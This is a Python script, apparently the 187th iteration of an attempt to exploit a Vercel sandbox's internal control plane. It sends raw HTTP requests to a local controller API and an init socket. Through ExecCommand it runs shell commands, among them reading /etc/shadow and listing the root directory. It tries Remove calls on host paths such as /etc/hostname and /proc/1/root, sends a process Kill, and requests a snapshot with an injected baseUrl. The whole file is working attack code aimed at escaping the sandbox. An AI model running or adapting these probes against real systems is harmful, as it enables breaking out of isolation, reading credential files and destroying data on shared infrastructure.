# -*- coding: utf-8 -*-
"""v187 阶段A: 沙箱用户视角控制面利用 - ExecCommand 输出环境验证
命令输出重定向到 /tmp/out187.txt 和 /vercel/sandbox/out187.txt (宿主/沙箱可见性差异判断执行环境)"""
import socket, json, os, time

OUT = '/vercel/sandbox/v187u.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')


def log(s, maxlen=2000):
    s = str(s)
    if len(s) > maxlen:
        s = s[:maxlen] + '...[TRUNC]'
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def tcp(port, path, body, t=4):
    b = json.dumps(body).encode()
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(('127.0.0.1', port))
        hdrs = 'POST %s HTTP/1.1\r\nHost: x\r\nContent-Type: application/json\r\n' % path
        hdrs += 'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n' % len(b)
        s.sendall(hdrs.encode() + b)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
                if len(d) > 5000:
                    break
        except Exception:
            pass
        s.close()
        st = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        return st, d[:4000]
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''


def unix(sp, path, body, t=4):
    b = json.dumps(body).encode()
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sp)
        hdrs = 'POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: application/json\r\n' % path
        hdrs += 'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n' % len(b)
        s.sendall(hdrs.encode() + b)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
                if len(d) > 5000:
                    break
        except Exception:
            pass
        s.close()
        st = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        return st, d[:4000]
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''


CTRL = 'vercel.sandbox.api.controller.v1.ControllerService'
FS = 'vercel.sandbox.api.controller.v1.FileSystemService'

log('=== 1 ExecCommand env probe ===')
# 输出到两个位置, 判断执行环境
cmds = [
    ('id; hostname; pwd; cat /etc/hostname 2>&1 | head -1; cat /etc/shadow 2>&1 | head -1; '
     'ls -la / 2>&1 | head -15; cat /etc/os-release 2>&1 | head -3'),
]
cmd_ids = {}
for i, c in enumerate(cmds):
    body = {'command': '/bin/sh', 'args': ['-c', 'id > /tmp/out187.txt 2>&1; '
                                                 'echo TMP_WRITE_RC=$? >> /tmp/out187.txt; '
                                                 'id > /vercel/sandbox/out187.txt 2>&1; '
                                                 'echo SBX_WRITE_RC=$? >> /vercel/sandbox/out187.txt; '
                                                 'hostname >> /tmp/out187.txt; '
                                                 'uname -a >> /tmp/out187.txt; ' + c]}
    st, pay = tcp(23456, '/' + CTRL + '/ExecCommand', body, t=5)
    log('EC%d %s -> %s %r' % (i, json.dumps(body)[:150], st, pay[:600]))
    try:
        cid = json.loads(pay.split(b'\r\n\r\n', 1)[1].decode(errors='replace')).get('commandId')
        if cid:
            cmd_ids[i] = cid
            log('CID%d=%s' % (i, cid))
    except Exception as e:
        log('PARSE %s' % e)
    time.sleep(1)

log('=== 2 WaitCommand real ids ===')
for i, cid in cmd_ids.items():
    st, pay = tcp(23456, '/' + CTRL + '/WaitCommand', {'commandId': cid}, t=6)
    log('WC%d %s -> %s %r' % (i, cid, st, pay[:800]))
    time.sleep(0.5)

log('=== 3 local files after exec ===')
for p in ['/tmp/out187.txt', '/vercel/sandbox/out187.txt']:
    try:
        d = open(p, 'r', encoding='utf-8', errors='replace').read()
        log('FILE %s (%d): %r' % (p, len(d), d[:1500]))
    except Exception as e:
        log('FILE %s EXC %s' % (p, e))

log('=== 4 Remove path semantics ===')
# 创建测试文件
open('/vercel/sandbox/rmtest.txt', 'w').write('RM187')
open('/tmp/rmtest_host.txt', 'w').write('RM187H')
for path in ['/vercel/sandbox/rmtest.txt', '/tmp/rmtest_host.txt',
             '/etc/nonexistent_v187_xyz', '/proc/1/root/etc/hostname', '/etc/hostname']:
    st, pay = tcp(23456, '/' + FS + '/Remove', {'path': path}, t=3)
    log('RM %s -> %s %r' % (path, st, pay[:400]))
    time.sleep(0.3)
for p in ['/vercel/sandbox/rmtest.txt', '/tmp/rmtest_host.txt']:
    try:
        os.stat(p)
        log('AFTER %s EXISTS' % p)
    except Exception:
        log('AFTER %s GONE' % p)

log('=== 5 init.sock spawn ===')
INIT = '/run/vercel/share/init.sock'
SP = 'vercel.sandbox.spawn.v1.SpawnService'
st, pay = unix(INIT, '/' + SP + '/Ping', {}, t=3)
log('SPAWN Ping -> %s %r' % (st, pay[:300]))
st, pay = unix(INIT, '/' + SP + '/Kill', {'processId': 'hvcp_' + 'a' * 26}, t=3)
log('SPAWN Kill -> %s %r' % (st, pay[:300]))

log('=== 6 CreateSnapshot user view ===')
for body in [{'driveId': 'sandbox'}, {'driveId': 'sandbox', 'baseUrl': 'http://127.0.0.1:9/x'}]:
    st, pay = tcp(23456, '/' + CTRL + '/CreateSnapshot', body, t=4)
    log('CS %s -> %s %r' % (json.dumps(body)[:100], st, pay[:400]))
    time.sleep(0.3)

log('V187U_DONE')
f.close()
